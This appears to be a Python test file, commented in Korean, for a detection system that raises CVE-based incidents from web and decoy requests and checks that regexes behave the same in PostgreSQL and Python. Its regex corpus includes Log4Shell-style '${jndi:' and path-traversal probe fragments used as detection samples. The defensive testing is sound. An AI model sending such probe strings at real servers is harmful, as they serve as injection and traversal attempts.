    def test_run_은_근거에_서명과_발생원을_남긴다(self):
        with mock.patch.object(detect, "execute_batch", psycopg2.extras.execute_batch):
            detect.run(self.conn, load("rules_cve.json"), None, None, verbose=False)
        self.cur.execute("SELECT rule_id, host(actor_ip), signal_count, evidence FROM incidents ORDER BY 1, 2")
        rows = self.cur.fetchall()
        self.assertEqual(len(rows), 4)             # 규칙마다 출발지(web-01 · 디코이 요청) 하나씩, 통합 창 안에 이어진다
        got = {(r, ip): (n, ev) for r, ip, n, ev in rows}
        for rid in ("R105", "R106"):
            for ip, sensor in (("192.0.2.10", "web-01"), ("192.0.2.20", "decoy")):
                with self.subTest(rule=rid, ip=ip):
                    want = self.want(rid, lambda k: k[1] == sensor)
                    n, ev = got[(rid, ip)]
                    self.assertEqual(n, len(want))
                    self.assertEqual(ev["signatures"], sorted({i for *_, d in want for i in d["signatures"]}))
                    self.assertEqual(ev["sensors"], [sensor])
        self.cur.execute("SELECT rule_version, definition FROM rule_versions")
        self.assertEqual(self.cur.fetchall(), [("c1", load("rules_cve.json"))])


@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
class UrlSignatureLateArrivalDatabaseTest(unittest.TestCase):
    """늦게 들어온 더 이른 요청(구조적 한계, w2 R102 와 같다). 고치지 않고 rules_cve.json note 와 pull_loki.py docstring 에
    적었다. 이 시험은 그 적힌 동작을 고정한다. 한계를 고치면 이 시험과 두 문서를 함께 고친다.

    사건 키는 묶음의 첫 신호 시각이다. 1분 다리가 web-01 요청을 먼저 넣고 5분 적재기가 같은 출발지의 더 이른 디코이
    요청을 늦게 넣으면, 다음 회차에 첫 시각이 앞당겨진 새 키 사건이 생긴다. c1 에는 억제가 없어 먼저 뜬 사건은 남는다.
    """

    IP = "198.51.100.7"
    NOON = datetime(2026, 9, 24, 12, 0, tzinfo=UTC)

    def setUp(self):
        self.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
        self.cur = self.conn.cursor()
        self.cur.execute("SET search_path TO pg_temp")
        self.cur.execute(URL_SIGNATURE_TEMP_TABLES)

    def tearDown(self):
        self.conn.rollback()
        self.conn.close()

    def request(self, line_hash, minutes, eventid, sensor, url, session=None):
        self.cur.execute("INSERT INTO events VALUES (%s, %s, %s, %s, %s, %s, 'real', 'GET', 404, %s)",
                         (line_hash, self.NOON + timedelta(minutes=minutes), eventid, session, self.IP, url, sensor))

    def incidents(self):
        # 한 회차. run 은 커밋하지만 임시 표라 연결을 닫으면 사라진다
        with mock.patch.object(detect, "execute_batch", psycopg2.extras.execute_batch):
            detect.run(self.conn, load("rules_cve.json"), None, None, verbose=False)
        self.cur.execute("SELECT incident_key, signal_count FROM incidents ORDER BY incident_key")
        return self.cur.fetchall()

    def test_늦게_들어온_더_이른_디코이_요청은_새_키로_뜨고_먼저_뜬_사건이_남는다(self):
        key = lambda m: f"R105|c1|{self.IP}|{(self.NOON + timedelta(minutes=m)).isoformat()}"
        self.request("n1", 2, "nginx.request", "web-01", "/owa/")                  # 다리 회차(12:03)에 들어온다
        self.assertEqual(self.incidents(), [(key(2), 1)])
        self.request("d1", 0, "decoy.request", "decoy", "/geoserver/web/", "s1")   # 적재기(12:05)가 늦게 넣는다
        self.assertEqual(self.incidents(), [(key(0), 2), (key(2), 1)])


@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
class RegexGapDatabaseTest(unittest.TestCase):
    """regex_gap 이 받는 정규식은 PostgreSQL(~*)과 파이썬(re.I | re.S)이 같은 답을 낸다. 거절하는 것 중 정책으로 막는 것
    (앞뒤 보기 · 맨 앞 플래그 · 주석 · 역참조 · 파이썬이 뜻이 바뀔 수 있다고 경고하는 겹친 집합) 밖은 실제로 어느 한쪽 이상이
    오류이거나 답이 다르다. 표본 문자열에 줄바꿈은 넣지 않는다($ 의 뜻이 값에 따라 다른 것은 regex_gap 이 보지 않는다)."""

    CORPUS = ["geo", "GEO", "geogeo", "ge", "gee", "geeo", "geoo", "x", "xgeo", "geox", "x1", "xa", "a geo", "a\bgeo",
              "a\\geo", "geo\\b", "(geo", "?geo", "geo+", "geo?", "{geo}", "geo{,2}", "geo{2}", "gg", "ggeo", "ee", ":",
              "a", "e", "1", "]geo", "[geo", "ageo", "${jndi:", "%24%7bjndi%3a", "1.2", "2024", ".%2e", "../",
              "%%32%65%%32%65/", "", "Atlassian", "Confluence Server", "D-Link", "D-Link DIR-645 HNAP", "Microsoft",
              "Exchange Server", "Exchange", "OSGeo", "GeoServer", "JAI-EXT GeoServer", "Ivanti", "Pulse Secure",
              "Connect Secure", "Pulse Connect Secure", "Virtual Traffic Manager", "QNAP", "QNAP Systems", "QTS",
              "Network Attached Storage (NAS)", "Photo Station", "Samsung", "MagicINFO 9 Server", "httpd:2.4",
              "library/httpd@sha256:ab", "atlassian/confluence:8", "kartoza/geoserver:2.24", "vtm", "zxtm:1", "nginx"]
    # 정책으로 막는 것. 두 엔진이 지금은 같은 답을 내기도 하지만 받는 범위 · 규칙이 달라 쓰지 않는다
    POLICY = {r"(?<=x)geo", r"(?<!x)geo", r"geo(?=x)", r"geo(?!x)", r"(?i)geo", r"(?m)^geo", r"(?#c)geo", r"(g)\1",
              r"(g)(e)\2", r"[[a]geo", r"[a-z&&[^e]]", r"[a[]geo", r"[a&&b]", r"[a||b]", r"[a~~b]", r"[a--b]"}

    @classmethod
    def setUpClass(cls):
        cls.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
        cls.conn.autocommit = True                 # 표를 만들지 않는다. 오류 난 문장이 다음 문장을 막지 않게 한다

    @classmethod
    def tearDownClass(cls):
        cls.conn.close()

    def pg(self, pattern):
        with self.conn.cursor() as cur:
            try:
                cur.execute("SELECT array_agg(s ~* %s ORDER BY o) FROM unnest(%s::text[]) WITH ORDINALITY AS u(s, o)",
                            (pattern, self.CORPUS))
            except psycopg2.Error:
                return "오류"
            return cur.fetchone()[0]

    def py(self, pattern):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")                 # 겹친 집합 경고([[ 등). 답만 본다
            try:
                r = re.compile(pattern, re.I | re.S)
            except re.error:
                return "오류"
        return [bool(r.search(x)) for x in self.CORPUS]

    def test_받는_정규식은_같은_답(self):
        doc = load("rules_cve.json")
        real = [v for r in doc["rules"] for s in r["params"]["signatures"]
                for v in list((s.get("kev_match") or {}).values()) + s["asset_match"]["images"]]
        self.assertTrue(real)
        for pattern in REGEX_SAME + real:
            with self.subTest(pattern=pattern):
                self.assertIsNone(detect.regex_gap(pattern))
                got = self.pg(pattern)
                self.assertNotEqual(got, "오류")
                self.assertEqual(got, self.py(pattern))

    def test_정책_밖의_거절은_실제로_다르다(self):
        self.assertLessEqual(self.POLICY, set(REGEX_GAPS))
        for pattern in REGEX_GAPS:
            if pattern in self.POLICY:
                continue
            with self.subTest(pattern=pattern):
                pg, py = self.pg(pattern), self.py(pattern)
                self.assertTrue("오류" in (pg, py) or pg != py, (pg, py))


if __name__ == "__main__":
    unittest.main(verbosity=2)
